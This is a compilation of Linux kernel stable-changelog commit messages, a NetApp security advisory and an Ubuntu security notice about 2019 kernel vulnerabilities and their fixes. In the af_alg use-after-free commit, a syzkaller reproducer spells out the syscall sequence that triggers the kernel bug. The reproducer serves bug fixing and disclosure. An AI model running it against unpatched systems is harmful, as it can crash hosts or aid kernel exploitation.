rate-limited (e.g TTL expired) and continues to receive traffic,
the redirect packets will never be transmitted. This happens since
peer->rate\_tokens will be typically greater than 'ip\_rt\_redirect\_number'
and so it will never be reset even if the redirect silence timeout
(ip\_rt\_redirect\_silence) has elapsed without receiving any packet
requiring redirects.
Fix it by using a dedicated counter for the number of ICMP redirect
packets that has been sent by the host
I have not been able to identify a given commit that introduced the
issue since ip\_rt\_send\_redirect implements the same rate-limiting
algorithm from commit 1da177e4c3f4 ("Linux-2.6.12-rc2")
Signed-off-by: Lorenzo Bianconi
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 4523bc864077a1e64a5b28b10a2b910bfa940bc8
Author: Lorenzo Bianconi
Date: Fri Feb 15 15:10:32 2019 +0100
net: ip6\_gre: initialize erspan\_ver just for erspan tunnels
[ Upstream commit 4974d5f678abb34401558559d47e2ea3d1c15cba ]
After commit c706863bc890 ("net: ip6\_gre: always reports o\_key to
userspace"), ip6gre and ip6gretap tunnels started reporting TUNNEL\_KEY
output flag even if it is not configured.
ip6gre\_fill\_info checks erspan\_ver value to add TUNNEL\_KEY for
erspan tunnels, however in commit 84581bdae9587 ("erspan: set
erspan\_ver to 1 by default when adding an erspan dev")
erspan\_ver is initialized to 1 even for ip6gre or ip6gretap
Fix the issue moving erspan\_ver initialization in a dedicated routine
Fixes: c706863bc890 ("net: ip6\_gre: always reports o\_key to userspace")
Signed-off-by: Lorenzo Bianconi
Reviewed-by: Greg Rose
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 4c1b91b82c43bca23dbd7bba75f6a532d32c660a
Author: Zhiqiang Liu
Date: Mon Feb 11 10:57:46 2019 +0800
net: fix IPv6 prefix route residue
[ Upstream commit e75913c93f7cd5f338ab373c34c93a655bd309cb ]
Follow those steps:
# ip addr add 2001:123::1/32 dev eth0
# ip addr add 2001:123:456::2/64 dev eth0
# ip addr del 2001:123::1/32 dev eth0
# ip addr del 2001:123:456::2/64 dev eth0
and then prefix route of 2001:123::1/32 will still exist.
This is because ipv6\_prefix\_equal in check\_cleanup\_prefix\_route
func does not check whether two IPv6 addresses have the same
prefix length. If the prefix of one address starts with another
shorter address prefix, even though their prefix lengths are
different, the return value of ipv6\_prefix\_equal is true.
Here I add a check of whether two addresses have the same prefix
to decide whether their prefixes are equal.
Fixes: 5b84efecb7d9 ("ipv6 addrconf: don't cleanup prefix route for IFA\_F\_NOPREFIXROUTE")
Signed-off-by: Zhiqiang Liu
Reported-by: Wenhao Zhang
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit b2975c2e83424fd19e9781c38800d1c0d6a707e6
Author: Hauke Mehrtens
Date: Fri Feb 15 17:58:54 2019 +0100
net: Fix for\_each\_netdev\_feature on Big endian
[ Upstream commit 3b89ea9c5902acccdbbdec307c85edd1bf52515e ]
The features attribute is of type u64 and stored in the native endianes on
the system. The for\_each\_set\_bit() macro takes a pointer to a 32 bit array
and goes over the bits in this area. On little Endian systems this also
works with an u64 as the most significant bit is on the highest address,
but on big endian the words are swapped. When we expect bit 15 here we get
bit 47 (15 + 32).
This patch converts it more or less to its own for\_each\_set\_bit()
implementation which works on 64 bit integers directly. This is then
completely in host endianness and should work like expected.
Fixes: fd867d51f ("net/core: generic support for disabling netdev features down stack")
Signed-off-by: Hauke Mehrtens
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit eb5e6869125f69dd28513f92992d97ec62bb9773
Author: Mao Wenan
Date: Mon Feb 18 10:44:44 2019 +0800
net: crypto set sk to NULL when af\_alg\_release.
[ Upstream commit 9060cb719e61b685ec0102574e10337fa5f445ea ]
KASAN has found use-after-free in sockfs\_setattr.
The existed commit 6d8c50dcb029 ("socket: close race condition between sock\_close()
and sockfs\_setattr()") is to fix this simillar issue, but it seems to ignore
that crypto module forgets to set the sk to NULL after af\_alg\_release.
KASAN report details as below:
BUG: KASAN: use-after-free in sockfs\_setattr+0x120/0x150
Write of size 4 at addr ffff88837b956128 by task syz-executor0/4186
CPU: 2 PID: 4186 Comm: syz-executor0 Not tainted xxx + #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
1.10.2-1ubuntu1 04/01/2014
Call Trace:
dump\_stack+0xca/0x13e
print\_address\_description+0x79/0x330
? vprintk\_func+0x5e/0xf0
kasan\_report+0x18a/0x2e0
? sockfs\_setattr+0x120/0x150
sockfs\_setattr+0x120/0x150
? sock\_register+0x2d0/0x2d0
notify\_change+0x90c/0xd40
? chown\_common+0x2ef/0x510
chown\_common+0x2ef/0x510
? chmod\_common+0x3b0/0x3b0
? \_\_lock\_is\_held+0xbc/0x160
? \_\_sb\_start\_write+0x13d/0x2b0
? \_\_mnt\_want\_write+0x19a/0x250
do\_fchownat+0x15c/0x190
? \_\_ia32\_sys\_chmod+0x80/0x80
? trace\_hardirqs\_on\_thunk+0x1a/0x1c
\_\_x64\_sys\_fchownat+0xbf/0x160
? lockdep\_hardirqs\_on+0x39a/0x5e0
do\_syscall\_64+0xc8/0x580
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x462589
Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89
f7 48 89 d6 48 89
ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3
48 c7 c1 bc ff ff
ff f7 d8 64 89 01 48
RSP: 002b:00007fb4b2c83c58 EFLAGS: 00000246 ORIG\_RAX: 0000000000000104
RAX: ffffffffffffffda RBX: 000000000072bfa0 RCX: 0000000000462589
RDX: 0000000000000000 RSI: 00000000200000c0 RDI: 0000000000000007
RBP: 0000000000000005 R08: 0000000000001000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 00007fb4b2c846bc
R13: 00000000004bc733 R14: 00000000006f5138 R15: 00000000ffffffff
Allocated by task 4185:
kasan\_kmalloc+0xa0/0xd0
\_\_kmalloc+0x14a/0x350
sk\_prot\_alloc+0xf6/0x290
sk\_alloc+0x3d/0xc00
af\_alg\_accept+0x9e/0x670
hash\_accept+0x4a3/0x650
\_\_sys\_accept4+0x306/0x5c0
\_\_x64\_sys\_accept4+0x98/0x100
do\_syscall\_64+0xc8/0x580
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
Freed by task 4184:
\_\_kasan\_slab\_free+0x12e/0x180
kfree+0xeb/0x2f0
\_\_sk\_destruct+0x4e6/0x6a0
sk\_destruct+0x48/0x70
\_\_sk\_free+0xa9/0x270
sk\_free+0x2a/0x30
af\_alg\_release+0x5c/0x70
\_\_sock\_release+0xd3/0x280
sock\_close+0x1a/0x20
\_\_fput+0x27f/0x7f0
task\_work\_run+0x136/0x1b0
exit\_to\_usermode\_loop+0x1a7/0x1d0
do\_syscall\_64+0x461/0x580
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
Syzkaller reproducer:
r0 = perf\_event\_open(&(0x7f0000000000)={0x0, 0x70, 0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, @perf\_config\_ext}, 0x0, 0x0,
0xffffffffffffffff, 0x0)
r1 = socket$alg(0x26, 0x5, 0x0)
getrusage(0x0, 0x0)
bind(r1, &(0x7f00000001c0)=@alg={0x26, 'hash\x00', 0x0, 0x0,
'sha256-ssse3\x00'}, 0x80)
r2 = accept(r1, 0x0, 0x0)
r3 = accept4$unix(r2, 0x0, 0x0, 0x0)
r4 = dup3(r3, r0, 0x0)
fchownat(r4, &(0x7f00000000c0)='\x00', 0x0, 0x0, 0x1000)
Fixes: 6d8c50dcb029 ("socket: close race condition between sock\_close() and sockfs\_setattr()")
Signed-off-by: Mao Wenan
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit bd1488b8d4768ebe026cd719d162a8d5507e59a5
Author: Petr Machata
Date: Sun Feb 17 07:18:41 2019 +0000
mlxsw: \_\_mlxsw\_sp\_port\_headroom\_set(): Fix a use of local variable
[ Upstream commit 289460404f6947ef1c38e67d680be9a84161250b ]
The function-local variable "delay" enters the loop interpreted as delay
in bits. However, inside the loop it gets overwritten by the result of
mlxsw\_sp\_pg\_buf\_delay\_get(), and thus leaves the loop as quantity in
cells. Thus on second and further loop iterations, the headroom for a
given priority is configured with a wrong size.
Fix by introducing a loop-local variable, delay\_cells. Rename thres to
thres\_cells for consistency.
Fixes: f417f04da589 ("mlxsw: spectrum: Refactor port buffer configuration")
Signed-off-by: Petr Machata
Acked-by: Jiri Pirko
Signed-off-by: Ido Schimmel
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 017d511085a36f45e5da70fd1a442f97a2e7c147
Author: John David Anglin
Date: Mon Feb 11 13:40:21 2019 -0500
dsa: mv88e6xxx: Ensure all pending interrupts are handled prior to exit
[ Upstream commit 7c0db24cc431e2196d98a5d5ddaa9088e2fcbfe5 ]
The GPIO interrupt controller on the espressobin board only supports edge interrupts.
If one enables the use of hardware interrupts in the device tree for the 88E6341, it is
possible to miss an edge. When this happens, the INTn pin on the Marvell switch is
stuck low and no further interrupts occur.
I found after adding debug statements to mv88e6xxx\_g1\_irq\_thread\_work() that there is
a race in handling device interrupts (e.g. PHY link interrupts). Some interrupts are
directly cleared by reading the Global 1 status register. However, the device interrupt
flag, for example, is not cleared until all the unmasked SERDES and PHY ports are serviced.
This is done by reading the relevant SERDES and PHY status register.
The code only services interrupts whose status bit is set at the time of reading its status
register. If an interrupt event occurs after its status is read and before all interrupts
are serviced, then this event will not be serviced and the INTn output pin will remain low.
This is not a problem with polling or level interrupts since the handler will be called
again to process the event. However, it's a big problem when using level interrupts.
The fix presented here is to add a loop around the code servicing switch interrupts. If
any pending interrupts remain after the current set has been handled, we loop and process
the new set. If there are no pending interrupts after servicing, we are sure that INTn has
gone high and we will get an edge when a new event occurs.
Tested on espressobin board.
Fixes: dc30c35be720 ("net: dsa: mv88e6xxx: Implement interrupt support.")
Signed-off-by: John David Anglin
Tested-by: Andrew Lunn
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit bbbefe815f50fe5fc6382fec0cb2eb69b9ab0696
Author: Nicolas Dichtel
Date: Thu Jan 17 11:27:22 2019 +0100
af\_packet: fix raw sockets over 6in4 tunnel
[ Upstream commit 88a8121dc1d3d0dbddd411b79ed236b6b6ea415c ]
Since commit cb9f1b783850, scapy (which uses an AF\_PACKET socket in
SOCK\_RAW mode) is unable to send a basic icmp packet over a sit tunnel:
Here is a example of the setup:
$ ip link set ntfp2 up
$ ip addr add 10.125.0.1/24 dev ntfp2
$ ip tunnel add tun1 mode sit ttl 64 local 10.125.0.1 remote 10.125.0.2 dev ntfp2
$ ip addr add fd00:cafe:cafe::1/128 dev tun1
$ ip link set dev tun1 up
$ ip route add fd00:200::/64 dev tun1
$ scapy
>>> p = []
>>> p += IPv6(src='fd00:100::1', dst='fd00:200::1')/ICMPv6EchoRequest()
>>> send(p, count=1, inter=0.1)
>>> quit()
$ ip -s link ls dev tun1 | grep -A1 "TX.\*errors"
TX: bytes packets errors dropped carrier collsns
0 0 1 0 0 0
The problem is that the network offset is set to the hard\_header\_len of the
output device (tun1, ie 14 + 20) and in our case, because the packet is
small (48 bytes) the pskb\_inet\_may\_pull() fails (it tries to pull 40 bytes
(ipv6 header) starting from the network offset).
This problem is more generally related to device with variable hard header
length. To avoid a too intrusive patch in the current release, a (ugly)
workaround is proposed in this patch. It has to be cleaned up in net-next.
Link: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=993675a3100b1
Link: http://patchwork.ozlabs.org/patch/1024489/
Fixes: cb9f1b783850 ("ip: validate header length on virtual device xmit")
CC: Willem de Bruijn
CC: Maxim Mikityanskiy
Signed-off-by: Nicolas Dichtel
Acked-by: Willem de Bruijn
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin


=== Content from security.netapp.com_b6c14d24_20250120_234517.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [March 2019 Linux Kernel Vulnerabilities in NetApp Products](https://security.netapp.com/advisory/ntap-20190327-0002)

## March 2019 Linux Kernel Vulnerabilities in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20190327-0002 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20190327-0002 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20190327-0002 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20190327-0002 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20190327-0002
**Version:**
6.0

**Last updated:**
10/07/2020

**Status:**
Final.

**CVEs:** CVE-2019-9003, CVE-2019-9162

Overview
#### Summary

Multiple NetApp products incorporate Linux kernel. Linux kernel versions before 4.20.12 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of these vulnerabilities could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2019-9003](https://nvd.nist.gov/vuln/detail/CVE-2019-9003) | 7.5 (HIGH) | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2019-9162](https://nvd.nist.gov/vuln/detail/CVE-2019-9162) | 7.8 (HIGH) | CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.20.5>
* <https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.25>
* <https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.20.12>

Affected Products
#### Affected Products

* Cluster Network Switch (NetApp CN1610)
* NetApp SolidFire & HCI Management Node
* SnapProtect

#### Products Not Affected

* 7-Mode Transition Tool
* ATTO FibreBridge
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for Linux 7.3 and above
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for VMware vSphere 9.5 and above
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for Windows 7.3 and above
* Active IQ mobile app
* Brocade Fabric Operating System Firmware
* Brocade Network Advisor Software
* Clustered Data ONTAP
* Clustered Data ONTAP Antivirus Connector
* Data ONTAP operating in 7-Mode
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Storage Manager
* E-Series SANtricity Web Services (REST API) for Web Services Proxy
* Element Plug-in for vCenter Server
* FAS/AFF BIOS
* FAS/AFF Baseboard Management Controller (BMC)
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp Cloud Backup (formerly AltaVault)
* NetApp Cloud Backup OST Plug-in (formerly AltaVault OST Plug-in)
* NetApp Converged Systems Advisor Agent
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Nodes
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp Plug-in for Symantec NetBackup
* NetApp SANtricity Cloud Connector
* NetApp SANtricity SMI-S Provider
* NetApp SMI-S Provider
* NetApp Service Level Manager
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SteelStore Cloud Integrated Storage
* NetApp Storage Encryption
* NetApp VASA Provider for Clustered Data ONTAP 7.2 and above
* ONTAP Select Deploy administration utility
* OnCommand API Services
* OnCommand Cloud Manager
* OnCommand Insight
* OnCommand System Manager 3.x
* OnCommand System Manager 9.x
* OnCommand Unified Manager for 7-Mode (core package)
* OnCommand Workflow Automation
* Open Systems SnapVault Agent
* RAID Controller CTS2600 Legacy Engenio
* SAS Firmware
* Service Processor
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapDrive for Unix
* SnapDrive for Windows
* SnapManager for Exchange
* SnapManager for Hyper-V
* SnapManager for MS SQL
* SnapManager for Oracle
* SnapManager for SAP
* SnapManager for Sharepoint
* Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 7.2 and above
* Storage Replication Adapter for Clustered Data ONTAP for Windows 7.2 and above
* Storage Services Connector
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID Baseboard Management Controller (BMC)
* StorageGRID9 (9.x and prior)
* Trident
* Virtual Storage Console for VMware vSphere 7.2 and above

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **NetApp SolidFire & HCI Management Node** | <https://mysupport.netapp.com/site/products/all/details/element-software/downloads-tab/download/62654/12.0> <https://mysupport.netapp.com/site/products/all/details/netapp-hci/downloads-tab/download/62542/1.8> |
| **Cluster Network Switch (NetApp CN1610)** | Cluster Network Switch (NetApp CN1610) has no plans to address this vulnerability. |
| **SnapProtect** | SnapProtect has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2426797.html) for more information. |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20190327-0002>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20190327 | Initial Public Release |
| 2.0 | 20190419 | FAS/AFF Baseboard Management Controller (BMC) moved to Products Not Affected |
| 3.0 | 20190426 | Service Processor moved to Products Not Affected |
| 4.0 | 20190531 | SnapProtect moved to Won't Fix status |
| 5.0 | 20190731 | Cluster Network Switch (NetApp CN1610) moved to Won't Fix status |
| 6.0 | 20201007 | NetApp HCI Compute Nodes and NetApp HCI Storage Nodes added to Software Versions and Fixes, Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from usn.ubuntu.com_d5cd14a1_20250120_234519.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3930-1: Linux kernel vulnerabilities

2 April 2019

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.10](/security/notices?release=cosmic)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-aws](/security/cves?package=linux-aws) - Linux kernel for Amazon Web Services (AWS) systems
* [linux-azure](/security/cves?package=linux-azure) - Linux kernel for Microsoft Azure Cloud systems
* [linux-gcp](/security/cves?package=linux-gcp) - Linux kernel for Google Cloud Platform (GCP) systems
* [linux-kvm](/security/cves?package=linux-kvm) - Linux kernel for cloud environments
* [linux-raspi2](/security/cves?package=linux-raspi2) - Linux kernel for Raspberry Pi 2

## Details

Mathias Payer and Hui Peng discovered a use-after-free vulnerability in the

Advanced Linux Sound Architecture (ALSA) subsystem. A physically proximate

attacker could use this to cause a denial of service (system crash).

([CVE-2018-19824](/security/CVE-2018-19824))

Shlomi Oberman, Yuli Shapiro, and Ran Menscher discovered an information

leak in the Bluetooth implementation of the Linux kernel. An attacker

within Bluetooth range could use this to expose sensitive information

(kernel memory). ([CVE-2019-3459](/security/CVE-2019-3459), [CVE-2019-3460](/security/CVE-2019-3460))

Jann Horn discovered that the KVM implementation in the Linux kernel

contained a use-after-free vulnerability. An attacker in a guest VM with

access to /dev/kvm could use this to cause a denial of service (guest VM

crash). ([CVE-2019-6974](/security/CVE-2019-6974))

Jim Mattson and Felix Wilhelm discovered a use-after-free vulnerability in

the KVM subsystem of the Linux kernel, when using nested virtual machines.

A local attacker in a guest VM could use this to cause a denial of service

(system crash) or possibly execute arbitrary code in the host system.

([CVE-2019-7221](/security/CVE-2019-7221))

Felix Wilhelm discovered that an information leak vulnerability existed in

the KVM subsystem of the Linux kernel, when nested virtualization is used.

A local attacker could use this to expose sensitive information (host

system memory to a guest VM). ([CVE-2019-7222](/security/CVE-2019-7222))

Jann Horn discovered that the eBPF implementation in the Linux kernel was

insufficiently hardened against Spectre V1 attacks. A local attacker could

use this to expose sensitive information. ([CVE-2019-7308](/security/CVE-2019-7308))

It was discovered that a use-after-free vulnerability existed in the user-

space API for crypto (af\_alg) implementation in the Linux kernel. A local

attacker could use this to cause a denial of service (system crash) or

possibly execute arbitrary code. ([CVE-2019-8912](/security/CVE-2019-8912))

Jakub Jirasek discovered a use-after-free vulnerability in the SCTP

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-8956](/security/CVE-2019-8956))

It was discovered that the Linux kernel did not properly deallocate memory

when handling certain errors while reading files. A local attacker could

use this to cause a denial of service (excessive memory consumption).

([CVE-2019-8980](/security/CVE-2019-8980))

It was discovered that a use-after-free vulnerability existed in the IPMI

implementation in the Linux kernel. A local attacker with access to the

IPMI character device files could use this to cause a denial of service

(system crash). ([CVE-2019-9003](/security/CVE-2019-9003))

Jann Horn discovered that the SNMP NAT implementation in the Linux kernel

performed insufficient ASN.1 length checks. An attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-9162](/security/CVE-2019-9162))

Jann Horn discovered that the mmap implementation in the Linux kernel did

not properly check for the mmap minimum address in some situations. A local

attacker could use this to assist exploiting a kernel NULL pointer

dereference vulnerability. ([CVE-2019-9213](/security/CVE-2019-9213))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.10

* linux-image-gke
  -
  4.18.0.1008.8
* [linux-image-4.18.0-17-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.18.0-17.18](https://launchpad.net/ubuntu/%2Bsource/linux/4.18.0-17.18)
* linux-image-generic
  -
  4.18.0.17.18
* [linux-image-4.18.0-17-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.18.0-17.18](https://launchpad.net/ubuntu/%2Bsource/linux/4.18.0-17.18)
* linux-image-gcp
  -
  4.18.0.1008.8
* linux-image-azure
  -
  4.18.0.1014.15
* [linux-image-4.18.0-1012-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws)
  -
  [4.18.0-1012.14](https://launchpad.net/ubuntu/%2Bsource/linux-aws/4.18.0-1012.14)
* linux-image-virtual
  -
  4.18.0.17.18
* [linux-image-4.18.0-1011-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.18.0-1011.13](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.18.0-1011.13)
* linux-image-raspi2
  -
  4.18.0.1011.8
* [linux-image-4.18.0-1014-azure](https://launchpad.net/ubuntu/%2Bsource/linux-azure)
  -
  [4.18.0-1014.14](https://launchpad.net/ubuntu/%2Bsource/linux-azure/4.18.0-1014.14)
* linux-image-generic-lpae
  -
  4.18.0.17.18
* linux-image-snapdragon
  -
  4.18.0.17.18
* [linux-image-4.18.0-17-generic](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.18.0-17.18](https://launchpad.net/ubuntu/%2Bsource/linux/4.18.0-17.18)
* linux-image-kvm
  -
  4.18.0.1009.9
* [linux-image-4.18.0-1009-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [4.18.0-1009.9](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/4.18.0-1009.9)
* [linux-image-4.18.0-1008-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-gcp)
  -
  [4.18.0-1008.9](https://launchpad.net/ubuntu/%2Bsource/linux-gcp/4.18.0-1008.9)
* linux-image-lowlatency
  -
  4.18.0.17.18
* [linux-image-4.18.0-17-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.18.0-17.18](https://launchpad.net/ubuntu/%2Bsource/linux/4.18.0-17.18)
* linux-image-aws
  -
  4.18.0.1012.12

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-19824](/security/CVE-2018-19824)
* [CVE-2019-3459](/security/CVE-2019-3459)
* [CVE-2019-3460](/security/CVE-2019-3460)
* [CVE-2019-6974](/security/CVE-2019-6974)
* [CVE-2019-7221](/security/CVE-2019-7221)
* [CVE-2019-7222](/security/CVE-2019-7222)
* [CVE-2019-7308](/security/CVE-2019-7308)
* [CVE-2019-8912](/security/CVE-2019-8912)
* [CVE-2019-8956](/security/CVE-2019-8956)
* [CVE-2019-8980](/security/CVE-2019-8980)
* [CVE-2019-9003](/security/CVE-2019-9003)
* [CVE-2019-9162](/security/CVE-2019-9162)
* [CVE-2019-9213](/security/CVE-2019-9213)

## Related notices

* [USN-3933-2](/security/notices/USN-3933-2)
* [USN-3933-1](/security/notices/USN-3933-1)
* [USN-3930-2](/security/notices/USN-3930-2)
* [USN-3879-1](/security/notices/USN-3879-1)
* [USN-3879-2](/security/notices/USN-3879-2)
* [USN-3931-2](/security/notices/USN-3931-2)
* [USN-3931-1](/security/notices/USN-3931-1)
* [USN-3932-1](/security/notices/USN-3932-1)
* [USN-3932-2](/security/notices/USN-3932-2)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
